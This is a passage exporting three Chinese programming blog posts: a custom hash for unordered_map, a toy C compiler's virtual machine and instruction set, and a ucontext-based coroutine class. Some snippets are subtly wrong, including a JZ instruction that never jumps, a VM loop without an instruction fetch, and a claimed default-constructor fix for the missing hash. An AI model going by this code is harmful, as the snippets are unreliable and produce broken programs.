[{"content":"最近在力扣上做了一道题，lc73，矩阵置零。\n这题我第一反应是先拿暴力做一下看看，就是简单的先把原始 0 的位置保存下来，然后再去置 0。所以我本能的想到了 unordered_map。\n代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  class Solution { public: struct node// 节点  { node(int a, int b) :x(a), y(b) {} int x; int y; }; void helper(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; matrix, int q, int p) { for(int i = 0;i \u0026lt; matrix[0].size();++i)// 横行置 0  matrix[q][i] = 0; for(int i = 0;i \u0026lt; matrix.size();++i)// 纵列置 0  matrix[i][p] = 0; } void setZeroes(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; matrix) { unordered_map\u0026lt;node, int\u0026gt; m; for(int i = 0;i \u0026lt; matrix.size();++i)// 遍历一遍把 0 的位置存下来  { for(int j = 0;j \u0026lt; matrix[0].size();++j) { if(matrix[i][j] == 0) m[node(i, j)] = 1; } } for(int i = 0;i \u0026lt; matrix.size();++i)// 根据 unordered_map 中的信息进行处理  { for(int j = 0;j \u0026lt; matrix[0].size();++j) { if(matrix[i][j] == 0 \u0026amp;\u0026amp; m.find(node(i, j)) != m.end()) { helper(matrix, i, j); } } } } };   看起来没啥问题，但是一提交就能看到一大堆报错。报错信息如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  Line 19: Char 34: error: call to implicitly-deleted default constructor of \u0026#39;unordered_map\u0026lt;Solution::node, int\u0026gt;\u0026#39; unordered_map\u0026lt;node, int\u0026gt; m; ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unordered_map.h:141:7: note: explicitly defaulted function was implicitly deleted here unordered_map() = default; ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unordered_map.h:105:18: note: default constructor of \u0026#39;unordered_map\u0026lt;Solution::node, int, std::hash\u0026lt;Solution::node\u0026gt;, std::equal_to\u0026lt;Solution::node\u0026gt;, std::allocator\u0026lt;std::pair\u0026lt;const Solution::node, int\u0026gt;\u0026gt;\u0026gt;\u0026#39; is implicitly deleted because field \u0026#39;_M_h\u0026#39; has a deleted default constructor _Hashtable _M_h; ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/hashtable.h:438:7: note: explicitly defaulted function was implicitly deleted here _Hashtable() = default; ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/hashtable.h:174:7: note: default constructor of \u0026#39;_Hashtable\u0026lt;Solution::node, std::pair\u0026lt;const Solution::node, int\u0026gt;, std::allocator\u0026lt;std::pair\u0026lt;const Solution::node, int\u0026gt;\u0026gt;, std::__detail::_Select1st, std::equal_to\u0026lt;Solution::node\u0026gt;, std::hash\u0026lt;Solution::node\u0026gt;, std::__detail::_Mod_range_hashing, std::__detail::_Default_ranged_hash, std::__detail::_Prime_rehash_policy, std::__detail::_Hashtable_traits\u0026lt;true, false, true\u0026gt;\u0026gt;\u0026#39; is implicitly deleted because base class \u0026#39;__detail::_Hashtable_base\u0026lt;node, pair\u0026lt;const node, int\u0026gt;, _Select1st, equal_to\u0026lt;node\u0026gt;, hash\u0026lt;node\u0026gt;, _Mod_range_hashing, _Default_ranged_hash, _Hashtable_traits\u0026lt;true, false, true\u0026gt;\u0026gt;\u0026#39; has a deleted default constructor : public __detail::_Hashtable_base\u0026lt;_Key, _Value, _ExtractKey, _Equal, ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/hashtable_policy.h:1822:5: note: explicitly defaulted function was implicitly deleted here _Hashtable_base() = default; ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/hashtable_policy.h:1771:5: note: default constructor of \u0026#39;_Hashtable_base\u0026lt;Solution::node, std::pair\u0026lt;const Solution::node, int\u0026gt;, std::__detail::_Select1st, std::equal_to\u0026lt;Solution::node\u0026gt;, std::hash\u0026lt;Solution::node\u0026gt;, std::__detail::_Mod_range_hashing, std::__detail::_Default_ranged_hash, std::__detail::_Hashtable_traits\u0026lt;true, false, true\u0026gt;\u0026gt;\u0026#39; is implicitly deleted because base class \u0026#39;_Hash_code_base\u0026lt;Solution::node, std::pair\u0026lt;const Solution::node, int\u0026gt;, std::__detail::_Select1st, std::hash\u0026lt;Solution::node\u0026gt;, std::__detail::_Mod_range_hashing, std::__detail::_Default_ranged_hash, _Hashtable_traits\u0026lt;true, false, true\u0026gt;::__hash_cached::value\u0026gt;\u0026#39; has a deleted default constructor : public _Hash_code_base\u0026lt;_Key, _Value, _ExtractKey, _H1, _H2, _Hash, ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/hashtable_policy.h:1373:7: note: explicitly defaulted function was implicitly deleted here _Hash_code_base() = default; ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/hashtable_policy.h:1349:7: note: default constructor of \u0026#39;_Hash_code_base\u0026lt;Solution::node, std::pair\u0026lt;const Solution::node, int\u0026gt;, std::__detail::_Select1st, std::hash\u0026lt;Solution::node\u0026gt;, std::__detail::_Mod_range_hashing, std::__detail::_Default_ranged_hash, true\u0026gt;\u0026#39; is implicitly deleted because base class \u0026#39;_Hashtable_ebo_helper\u0026lt;1, std::hash\u0026lt;Solution::node\u0026gt;\u0026gt;\u0026#39; has a deleted default constructor private _Hashtable_ebo_helper\u0026lt;1, _H1\u0026gt;, ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/hashtable_policy.h:1096:7: note: explicitly defaulted function was implicitly deleted here _Hashtable_ebo_helper() = default; ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/hashtable_policy.h:1094:7: note: default constructor of \u0026#39;_Hashtable_ebo_helper\u0026lt;1, std::hash\u0026lt;Solution::node\u0026gt;, true\u0026gt;\u0026#39; is implicitly deleted because base class \u0026#39;std::hash\u0026lt;Solution::node\u0026gt;\u0026#39; has a deleted default constructor : private _Tp ^ /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/functional_hash.h:101:19: note: default constructor of \u0026#39;hash\u0026lt;Solution::node\u0026gt;\u0026#39; is implicitly deleted because base class \u0026#39;__hash_enum\u0026lt;Solution::node\u0026gt;\u0026#39; has no default constructor struct hash : __hash_enum\u0026lt;_Tp\u0026gt; ^   我不知道有没有人会看这一坨信息哈，我只能看懂最上面那部分，粗略猜想就是没法保存一个自制的结构体的信息，可能就是没法哈希，或者说不知道该咋对自制的结构体进行哈希。\n基于这个问题，我查了一些别人的解决办法，其实就是添加一个对这个结构体哈希的方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  class Solution { public: struct node { node() {} node(int a, int b) :x(a), y(b) {} int x; int y; bool operator == (const node\u0026amp; t) const// 重载 == \t{ return x == t.x \u0026amp;\u0026amp; y == t.y; } }; struct nodeHash// 用于哈希的结构体 \t{ std::size_t operator () (const node\u0026amp; t) const// 重载 () ，比较重要的是这几个 const 不能省略，上面那些也是，否则报错 \t{ return t.x * 100 + t.y;// 哈希方法，这个随便写，不过自己写的哈希可能哈希冲突的概率也大吧 \t} }; void helper(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; matrix, int q, int p) { for(int i = 0;i \u0026lt; matrix[0].size();++i) matrix[q][i] = 0; for(int i = 0;i \u0026lt; matrix.size();++i) matrix[i][p] = 0; } void setZeroes(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; matrix) { unordered_map\u0026lt;node, int, nodeHash\u0026gt; m;// 末尾多添加一个结构体  for(int i = 0;i \u0026lt; matrix.size();++i) { for(int j = 0;j \u0026lt; matrix[0].size();++j) { if(matrix[i][j] == 0) m[node(i, j)] = 1; } } for(int i = 0;i \u0026lt; matrix.size();++i) { for(int j = 0;j \u0026lt; matrix[0].size();++j) { if(matrix[i][j] == 0 \u0026amp;\u0026amp; m.find(node(i, j)) != m.end()) { helper(matrix, i, j); } } } } };   后续更新（2022-07-08）：\n后来又发现了一些东西，找到了两个最简单的可以解决这个问题的方法。一是给结构体添加默认构造函数，二是用 unordered_map 存储结构体的指针。这两个方法哪个都能解决，而最简单的必然是加一个默认构造函数，实在不行的话才需要考虑文中的这种方法。\n","date":"2022-06-30T00:00:00Z","permalink":"https://lunaasuka.github.io/p/%E5%85%B3%E4%BA%8E-unordered_map/","title":"关于 unordered_map"},{"content":"内存模拟 内存是程序运行所必要的资源，我们打算在虚拟机中去模拟运行目标代码，所以内存管理这个重要的工作自然就是交给虚拟机来干。那么我们就要在虚拟机中模拟出程序的内存模型：\n 代码段，text segment ，用于存放代码或者指令，在本编译器中用于存放我们自己设计的伪汇编指令。 数据段，data segment，用于存放初始化了的全局变量和静态变量，在本编译器中用于存放字符串，因为我们不支持变量初始化。 未初始化数据段，bss segment，用于存放未初始化的全局变量和静态变量，为简单起见，该数据段我们不打算模拟。 栈，stack，栈用于存放跟函数有关的数据，例如函数返回地址，函数的局部变量，函数的参数等。在本编译器中也是这个功能。 堆，heap，用于程序的动态分配内存。为简单起见，在本程序中我们让程序直接使用虚拟机的内存，这样我们就不需要自己控制动态内存的分配，因为这部分跟编译无关，所以我们主动将其剔除。  1 2 3 4  //在全局定义下加入以下代码 int* text;//模拟代码段 int* stack;//模拟栈 char* data;//模拟数据段   这里解释一下这三个变量的类型，text 是 int 型，它里面存放的是我们设计的伪指令和一些内存地址，伪指令我们后面会说到，都是枚举类型，所以实际存储的还是整型。stack 同理，存储的都是内存地址什么的。data 中存放的只有字符串，所以类型是 char。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  ...... close(fd); if(!(text = (int*)malloc(memorySize))) { printf(\u0026#34;could not malloc(%d) for text segment\\n\u0026#34;,memorySize); return -1; } if(!(data = (char*)malloc(memorySize))) { printf(\u0026#34;could not malloc(%d) for text segment\\n\u0026#34;,memorySize); return -1; } if(!(stack = (int*)malloc(memorySize))) { printf(\u0026#34;could not malloc(%d) for text segment\\n\u0026#34;,memorySize); return -1; } memset(text,0,memorySize); memset(stack,0,memorySize); memset(data,0,memorySize); parse(); ......   上面这一段代码是对那三个段进行初始化操作。这里的 malloc 和 memset 函数很复杂，我们不会去实现，所以我们会直接设计一些新的指令，让我们能够直接使用编译器中的函数和内存。这么做确实取巧，直接简化了内存管理这一整个复杂的工作，我知道它很重要，但是让我们先专注于这个简单的 demo 。\n寄存器 内存与寄存器才是计算机真正要操作和使用的设备。以前我不理解为什么计算机内部只有那么少数的寄存器，现在我理解了，寄存器真的很强大。\n因为我们这个编译器只需要模拟 4 个寄存器就能工作。只需四个寄存器就能完成这么复杂的工作，再多来几个我都不敢想。不过寄存器确实是很珍贵的元器件，如果你想在本编译器基础上继续扩充的话可以尝试多加几个寄存器。\n回到正题，我们要模拟的寄存器分别如下：\n PC寄存器，program counter register ，程序计数寄存器，它存放的是下一条指令的内存地址。 SP寄存器，stack pointer register，堆栈指针寄存器，它永远指向当前的栈顶。这里注意栈是向下生长的，也就是从高地址起始并且向低地址生长的，所以在 push 的时候 sp 的值是减小的。 BP寄存器，base pointer register，基址寄存器，它同样是用来操作栈的，它一般是和 SP 寄存器联合使用的，在调用函数的时候我们会用到它。 AX通用寄存器，accumulator register，累加寄存器，在该虚拟机中它用于存放一条指令执行之后的结果。  如果你从未接触过汇编可能不太能理解好这些寄存器的作用，不过没关系，现在你只需要知道它们是拿来存程序运行状态的，具体在这里就是存一些内存地址或者数据什么的。\n在全局定义下加入以下代码：\n1  int *pc,*sp,*bp,ax,cycle;   这里的 cycle 是用来记录生成了多少条指令的。可以先不去管它。\n然后初始化寄存器\n1 2 3 4 5 6 7 8 9  memset(data,0,memorySize); ...... sp = (int*)((int)stack + memorySize); bp = (int*)((int)stack + memorySize); ax = 0; parse(); ......   指令集 我们这里说的指令集和真正意义上能被翻译成二进制数据的命令不太一样，我们这里的指令集是根据虚拟机设计的一套简化的指令集，它可以被虚拟机有效识别并执行。\n我们这里使用枚举类型来构造指令集。全局定义如下：\n1 2 3 4 5 6 7  enum Instruction { LEA, IMM, JMP, JSR, JZ, JNZ, ENT, ADJ, LEV, LI, LC, SI, SC, PUSH, OR, XOR, AND, EQ, NE, LT, GT, LE, GE, SHL, SHR, ADD, SUB, MUL, DIV, MOD, OPEN, READ, CLOS, WRIT, PRTF, MALC, FREE, MSET, MCMP, EXIT };   这是我们要支持的全部指令，我们接下来会挨个解析这些指令。\n用于模拟 MOV 指令的指令 MOV 指令是最基础的汇编指令之一，为了尽可能的贴近真正的指令集，我们会既要简化指令集，又要使指令集能够模拟真实指令集的功能，所以我们会设计一些简单的指令来尝试模拟真实指令集中复杂的指令，例如 MOV 。MOV 的作用很简单，它用于将数据放进寄存器或内存地址，所以该指令有两个操作数。该指令功能看起来简单但是实现起来很复杂，首先我们的虚拟机只有一个通用寄存器，其次识别操作数的类型（是数据还是地址）也是一个问题，所以我们将 MOV 拆解为 5 个简单指令。注意，我们的指令集中只包含 0 操作数和 1 操作数的指令。\n IMM 将 放入通用寄存器 ax 当中。 LC 将 ax 中存放的地址中的字符型数据放进 ax 中。 LI 将 ax 中存放的地址中的整形数据放进 ax 中。 SC 将 ax 中的字符存入到 sp 寄存器中所存放的地址中，也就是说，我们 sp 寄存器中存放的是一个地址，我们将 ax 中的值载入到这个地址中。 SI 同上，只不过载入的是整形值。  有了以上五个命令就可以简单模拟 MOV 操作了，例如现在 sp 寄存器中存放了一个变量的地址，那我们就可以先 IMM 一个数到 ax 中，然后 SC/SI 将该值存入到目标变量中。\n不管怎样，我们大大简化了指令编写的复杂度，并且提高了灵活度，因为我们也同样可以拿上述几个指令干 MOV 以外的事。\n具体实现如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13  void VM() { int op, *tmp; while (1) { if (op == IMM) {ax = *pc++;} // load immediate value to ax  else if (op == LC) {ax = *(char *)ax;} // load character to ax, address in ax  else if (op == LI) {ax = *(int *)ax;} // load integer to ax, address in ax  else if (op == SC) {ax = *(char *)*sp++ = ax;} // save character to address, value in ax, address on stack  else if (op == SI) {*(int *)*sp++ = ax;} // save integer to address, value in ax, address on stack  } ... return 0; }   这里要记得我们所有的操作最后的结果都是存放在 ax 中的，而 ax 同样会有可能存放地址，所以有些操作可能看起来令人费解，关于这部分如果不懂的话可以暂且跳过，等程序完成或者虚拟机写完后你可以自行调试。\nPUSH 我们的 PUSH 的作用是将 ax 中的值存入 sp 中，也就是压栈。\n1  else if (op == PUSH) {*--sp = ax;}   JMP JMP 是跳转指令，可以操作 pc 寄存器来改变下一个要操作的地址。\n1  else if (op == JMP) {pc = (int*)*pc;}   pc 寄存器始终指向的是下一条指令的地址，跟真实的 pc 寄存器一样，我们把 addr 载入到 pc 中，那么下一次 pc 就会去运行 addr 中的指令。\nJZ/JNZ JZ 和 JNZ 可以用来实现条件判断，例如 if 和 while 这样的语句。JZ 是当 ax 为 0 的时候跳转，JNZ 是当 ax 不为 0 的时候跳转。\n1 2  else if (op == JZ) {pc = ax ? pc + 1 : (int*)pc;} else if (op == JNZ) {pc = ax ? (int*)*pc : pc + 1;}   函数调用 这部分就比较复杂了，我们用五个指令去模拟函数调用，分别是 CALL，ENT ，ADJ，LEV 和 LEA。\n简单介绍一下，CALL ，即跳转到 去运行，它与 JMP 的区别是 JMP 只会无条件跳转而 CALL 会存储用于回到当前上下文的地址。ENT 用于开辟栈空间，用于存放局部变量。ADJ 用于清除栈空间。LEV 后面再说，这里可以简单认为用于函数返回。LEA 用于处理函数参数。\n先看下 CALL ：\n1 2  else if (op == CALL) {*--sp = (int)(pc + 1); pc = (int*)*pc;}   这里突然想起来一件事，我们的所有指令和数据都是顺序存放的，如果有像 CALL 这样的有一个操作数的指令的时候，那么在 CALL 指令之后的这个数据就是操作数，只要顺序操作就行。\nOK，然后是负责栈空间的两个指令。我们知道每个函数内的变量都是局部变量，所以它们都是存放在栈上的，除此之外函数还可能会有参数，参数也应该存放在栈上。大概每种编程语言都有自己的关于函数调用的规则，例如参数入栈顺序之类的，不过这些对我们来说都不重要，要模拟它们可能很麻烦，我们就简单的采用顺序入栈就好。\n来看 ENT ：\n1 2  else if (op == ENT) {*--sp = (int)bp; bp = sp; sp = sp - *pc++;}   ENT 会用 bp 寄存器保存当前栈指针，然后在栈上保留出一定的空间用于存储局部变量。\nADJ ：\n1  else if (op == ADJ) {sp = sp + *pc++;}   ADJ 用于将将函数中的局部变量退栈。\nLEV：\n1  else if (op == LEV) {sp = bp; bp = (int*)*sp++; pc = (int*)*sp++;}   用于函数返回。\n最后是 LEA ：\n1  else if (op == LEA) {ax = (int)(bp + *pc++);}   该指令用于获取函数参数，来看一下此时栈的结构图\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  sub_function(arg1, arg2, arg3); | .... | high address +---------------+ | arg: 1 | new_bp + 4 +---------------+ | arg: 2 | new_bp + 3 +---------------+ | arg: 3 | new_bp + 2 +---------------+ |return address | new_bp + 1 +---------------+ | old BP | \u0026lt;- new BP +---------------+ | local var 1 | new_bp - 1 +---------------+ | local var 2 | new_bp - 2 +---------------+ | .... | low address   所以我们通过偏移量向上查找就能获取到函数参数。\n运算符指令 运算符有很多种，我们会支持一些运算符，如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  else if (op == OR) ax = *sp++ | ax; else if (op == XOR) ax = *sp++ ^ ax; else if (op == AND) ax = *sp++ \u0026amp; ax; else if (op == EQ) ax = *sp++ == ax; else if (op == NE) ax = *sp++ != ax; else if (op == LT) ax = *sp++ \u0026lt; ax; else if (op == LE) ax = *sp++ \u0026lt;= ax; else if (op == GT) ax = *sp++ \u0026gt; ax; else if (op == GE) ax = *sp++ \u0026gt;= ax; else if (op == SHL) ax = *sp++ \u0026lt;\u0026lt; ax; else if (op == SHR) ax = *sp++ \u0026gt;\u0026gt; ax; else if (op == ADD) ax = *sp++ + ax; else if (op == SUB) ax = *sp++ - ax; else if (op == MUL) ax = *sp++ * ax; else if (op == DIV) ax = *sp++ / ax; else if (op == MOD) ax = *sp++ % ax;   这里要注意的一点是这些运算符是二元的，也就是说需要操作两个值，我们把第一个参数放在栈顶，第二个放在 ax 中，然后把运算结果保存在 ax 中。\n内置函数 部分函数我们没法用这个简陋的编译器处理，例如 printf()，malloc()之类的，所以我们用内置函数的方式去处理，也就是直接把这些函数编译进这个编译器，用到的时候直接拿编译器内的函数去用就行。\n1 2 3 4 5 6 7 8  else if (op == EXIT) { printf(\u0026#34;exit(%d)\u0026#34;, *sp); return *sp;} else if (op == OPEN) { ax = open((char *)sp[1], sp[0]); } else if (op == CLOS) { ax = close(*sp);} else if (op == READ) { ax = read(sp[2], (char *)sp[1], *sp); } else if (op == PRTF) { tmp = sp + pc[1]; ax = printf((char *)tmp[-1], tmp[-2], tmp[-3], tmp[-4], tmp[-5], tmp[-6]); } else if (op == MALC) { ax = (int)malloc(*sp);} else if (op == MSET) { ax = (int)memset((char *)sp[2], sp[1], *sp);} else if (op == MCMP) { ax = memcmp((char *)sp[2], (char *)sp[1], *sp);}   这部分不重要，只要知道我们是从虚拟机的角度去实现这些函数即可。\n最后加个处理未知指令的判断即可\n1  else { printf(\u0026#34;unkown instruction = %d! cycle = %d\\n\u0026#34;, op, cycle); return -1; }   PS：当你在编写上述代码的时候可能会看到编译器会对某些地方标红，例如在强制转换的时候，这可能是因为你在64位的机器上编写这部分代码，因为在64位机器上指针的大小也是64位，所以将一个32位int和64位的指针来回转换看起来并不是很妥当，所以我推荐你在程序开头添加一个宏\n1  #define int int64_t   小结 本节我们设计了编译器内置的虚拟机和对应的指令集，通过这些指令集我们可以简单的模拟程序运行，在现代计算机中添加指令是很麻烦的事情，不同的指令会对应不同的电路，每添加或修改一次指令就会消耗大量的成本，但是对于虚拟机来说，添加新的指令很简单，几乎不会浪费多少资源和时间，如果你想，你可以在这个指令集的基础上添加更多的指令来完成更加复杂的功能。\n","date":"2022-06-24T00:00:00Z","permalink":"https://lunaasuka.github.io/p/%E4%BB%8E%E9%9B%B6%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AAc%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E5%99%A82/","title":"从零构建一个c语言编译器(2)"},{"content":"前置知识 协程，又被称为用户态线程，是完全在用户态实现并由程序员全权控制的一种结构。协程比线程更轻量化，效率更高，本文所讲的协程是基于 Linux 下 ucontext.h 这个库所进行开发的。简单介绍一下该库，ucontext.h 中封装了一个用于保存用户线程的上下文的结构体，并定义了几个函数用于操作上下文。\n1 2 3 4 5 6 7 8 9  typedef struct ucontext { unsigned long int uc_flags; struct ucontext *uc_link;// 当前上下文执行完了，下一个要执行的上下文  stack_t uc_stack;// 该上下文中使用的栈  mcontext_t uc_mcontext;// 保存当前上下文，即各个寄存器的状态  __sigset_t uc_sigmask;// 保存当前线程的信号屏蔽掩码  struct _libc_fpstate __fpregs_mem; } ucontext_t;   有关该结构体不需要深究，常用的就是 uc_stack 这个属性，我们后面会用到。\n1 2 3 4  int getcontext(ucontext_t* ucp);// 将当前上下文保存到 ucp 中 int setcontext(const ucontext_t* ucp);// 将 ucp 中的上下文恢复到 cpu 中 void makecontext(ucontext_t* ucp, void (*func)(), int argc, ...);// 修改 ucp 中的上下文，使其为函数 func 的入口，后面可以跟上参数 int swapcontext(ucontext_t* oucp, const ucontext_t* ucp);// 切换上下文，将当前上下文保存到 oucp 中，然后恢复 ucp 的上下文到 cpu 中   这四个函数都是使用汇编实现的，我们不做深究，只要知道怎么使用就行。\nPS：本文给出的是添加了后续调度器的协程，在本文末尾我会给出另外一个无调度器版本的协程。\nPSS：不论是之前的线程，还是接下来的任何轮子，我都写了一些用于显示辅助判断程序运行情况的标准输出，如果你有自己的日志系统可以尝试替换掉这些标准输出，或者用 DEBUG 宏来替代。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // 有关 DEBUG 宏的示例 #include \u0026lt;iostream\u0026gt; int main() { #ifdef DEBUG  std::cout \u0026lt;\u0026lt; \u0026#34;DEBUGING\u0026#34; \u0026lt;\u0026lt; std::endl; #endif  std::cout \u0026lt;\u0026lt; \u0026#34;Normal print\u0026#34; \u0026lt;\u0026lt; std::endl; return 0; } // g++ test.cpp -DDEBUG // 这个 DEBUG 宏叫什么都行，不过最后只有用 g++ 编译的时候带上 -D(something) 才会被执行。也就是说这个宏是被编译器定义的，编译器不定义它就不会被编译。   声明 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131  #ifndef __COLODA_FIBER_H__ #define __COLODA_FIBER_H__  #include \u0026lt;memory\u0026gt;#include \u0026lt;functional\u0026gt;#include \u0026lt;ucontext.h\u0026gt; namespace coloda { class Scheduler;// 调度器的声明，我们后续会实现  class Fiber : public std::enable_shared_from_this\u0026lt;Fiber\u0026gt;// 要用到智能指针进行管理，所以继承自enable_shared_from_this { friend class Scheduler;// 方便起见我们将调度器设置为友元类 public: typedef std::shared_ptr\u0026lt;Fiber\u0026gt; ptr; // 定义协程的状态  enum State { INIT,// 初始化  HOLD,// 暂停  EXEC,// 执行中  TERM,// 结束  READY,// 就绪  EXCEPT// 异常  }; public: /* * @brief: 无参构造函数 */ Fiber(); public: /* * @brief: 构造函数 * @param[in]: cb，目标函数 * @param[in]: stacksize，该协程的栈空间大小，默认为 0，也就是无法正常运行 * @param[in]: use_caller，是否在主协程上调度 */ Fiber(std::function\u0026lt;void()\u0026gt; cb, size_t stacksize = 0,bool use_caller = false); /* * @brief: 析构函数 */ ~Fiber(); /* * @brief: 重置协程执行函数，并重置协程状态为 INIT */ void reset(std::function\u0026lt;void()\u0026gt; cb); /* * @brief: 运行该协程，即把该协程切换到运行状态，需要调度器 */ void swapIn(); /* * @brief: 把该协程切换到后台，需要调度器 */ void swapOut(); /* * @brief: 同 swapIn()，但是是从主协程切换到该协程，无需调度器 */ void call(); /* * @brief: 同swapOut()，但是是从该协程切换到主协程，无需调度器 */ void back(); /* * @brief: 获取协程 Id */ uint64_t getId() const {return m_id;} /* * @brief: 获取协程状态 */ State getState() const {return m_state;} /* * @brief: 设置当前线程的运行协程 * @param[in]: f，协程 */ static void SetThis(Fiber* f); /* * @brief: 获取当前协程 */ static Fiber::ptr GetThis(); /* * @brief: 获取总协程数量 */ static uint64_t TotalFibers(); /* * @brief: 协程执行函数，执行完返回到调度协程，需要调度器 */ static void MainFunc(); /* * @brief: 协程执行函数，执行完返回到线程调度协程，无需调度器 */ static void CallerMainFunc(); /* * @brief: 获取当前协程 Id */ static uint64_t GetFiberId(); private: // 协程 Id  uint64_t m_id = 0; // 协程状态  State m_state = INIT; // 协程栈空间大小  uint32_t m_stacksize = 0; // 协程上下文  ucontext_t m_ctx; // 协程运行栈  void* m_stack = nullptr; // 协程运行函数  std::function\u0026lt;void()\u0026gt; m_cb; }; } #endif   定义 含调度器版本 开头 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  #include \u0026#34;fiber.h\u0026#34;#include \u0026lt;ucontext.h\u0026gt;#include \u0026#34;scheduler.h\u0026#34;#include \u0026lt;assert.h\u0026gt;#include \u0026lt;iostream\u0026gt;#include \u0026lt;atomic\u0026gt; namespace coloda { static std::atomic\u0026lt;uint64_t\u0026gt; s_fiber_id {0};// 原子变量，协程id static std::atomic\u0026lt;uint64_t\u0026gt; s_fiber_count {0};// 原子变量，协程个数  static thread_local Fiber* t_fiber = nullptr;// 线程内部变量，线程当前的协程 static thread_local Fiber::ptr t_threadFiber = nullptr;// 线程内部变量，线程的主协程  static int configSize = 128 * 1024;// 默认栈大小，后续会用到，当然这个可以开小一点  class StackAllocator// 协程栈空间分配器 { public: /* * @brief: 调用 malloc 来分配栈空间 */ static void* Alloc(size_t size) { return malloc(size); } /* * @brief: 调用 free 来回收栈空间 */ static void Dealloc(void* src) { return free(src); } };   无参构造函数 1 2 3 4 5 6 7 8 9 10 11  // 无参构造函数用于创建主协程 Fiber::Fiber() { m_state = EXEC;// 设置状态为 EXEC  SetThis(this);// 将该协程设置为当前线程的运行协程  if(getcontext(\u0026amp;m_ctx))// 尝试获取当前上下文  std::cout \u0026lt;\u0026lt; __FILE__ \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; __func__ \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; : getcontext() failed\u0026#34; \u0026lt;\u0026lt; std::endl; ++s_fiber_count;// 协程数增加  std::cout \u0026lt;\u0026lt; \u0026#34;Fiber::Fiber main\u0026#34; \u0026lt;\u0026lt; std::endl; }   有参构造函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // 有参构造函数用于正常创建协程 Fiber::Fiber(std::function\u0026lt;void()\u0026gt; cb,size_t stacksize,bool use_caller) :m_id(++s_fiber_id) ,m_cb(cb) { m_stacksize = stacksize ? stacksize : configSize;// 栈大小要么是传入的大小，要么是我们自己设置的默认大小  ++s_fiber_count; m_stack = StackAllocator::Alloc(m_stacksize);// 给运行栈分配大小  if(getcontext(\u0026amp;m_ctx)) std::cout \u0026lt;\u0026lt; __FILE__ \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; __func__ \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; : getcontext() failed\u0026#34; \u0026lt;\u0026lt; std::endl; // 设置上下文的一些属性  m_ctx.uc_link = nullptr;// 无下一个要运行的上下文  m_ctx.uc_stack.ss_sp = m_stack;// 运行栈  m_ctx.uc_stack.ss_size = m_stacksize;// 运行栈大小  if(!use_caller) makecontext(\u0026amp;m_ctx, \u0026amp;Fiber::MainFunc, 0);// 不在主协程上调度  else makecontext(\u0026amp;m_ctx, \u0026amp;Fiber::CallerMainFunc, 0);// 在主协程上调度  std::cout \u0026lt;\u0026lt; \u0026#34;Fiber::Fiber id = \u0026#34; \u0026lt;\u0026lt; m_id \u0026lt;\u0026lt; std::endl; }   析构函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  Fiber::~Fiber() { --s_fiber_count;// 减少协程总数量  if(m_stack != nullptr)// 尝试释放运行栈  { // 判断协程状态，当状态在以下情况时可以释放栈空间  if(m_state == INIT || m_state == TERM || m_state == EXCEPT) { StackAllocator::Dealloc(m_stack); } else// 如果协程状态不正确就直接退出，说明哪里出了问题导致提前析构  { std::cout \u0026lt;\u0026lt; __FILE__ \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; __func__ \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; __LINE__ 